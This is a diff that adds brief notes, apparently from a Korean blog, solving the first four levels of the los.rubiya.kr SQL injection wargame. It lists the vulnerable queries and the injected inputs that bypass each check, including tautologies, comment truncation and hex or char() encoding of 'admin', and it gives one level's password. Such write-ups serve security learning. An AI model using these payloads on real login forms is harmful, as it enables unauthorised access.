@@ -1,0 +1,21 @@
+출처 : http://goodasd123.tistory.com/
+[소스코드에서 핵심 확인]
+[문제해결 조건인 query 확인]
+[문제해결 조건인 filtering 확인]
+[솔루션]
+[추가할 말]
+>>gremlin(https://los.rubiya.kr/gate.php)
+select id from prob_gremlin where id='' and pw=''
+○select id from prob_gremlin where id='admin'or'1'='1' and pw=''
+○select id from prob_gremlin where id='' or 1=1#' and pw=''
+>>cobolt(https://los.rubiya.kr/chall/cobolt_b876ab5595253427d3bc34f1cd8f30db.php)
+selectid from prob_cobolt where id='' and pw=md5('')
+○select id from prob_cobolt where id='admin'or'1'='1' and pw=md5('')
+○select id from prob_cobolt where id='admin'#' and pw=md5('')
+>>goblin(https://los.rubiya.kr/chall/goblin_e5afb87a6716708e3af46a849517afdc.php)
+select id from prob_goblin where id='guest' and no=
+○select id from prob_goblin where id='guest' and no=2 or id=char(97,100,109,105,110)
+○select id from prob_goblin where id='guest' and no=2 or id=0x61646D696E
+>>orc(https://los.rubiya.kr/chall/orc_60e5b360f95c1f9688e4f3a86c5dd494.php)
+select id from prob_orc where id='admin' and pw=''
+○select id from prob_orc where id='admin' and pw='095a9852'
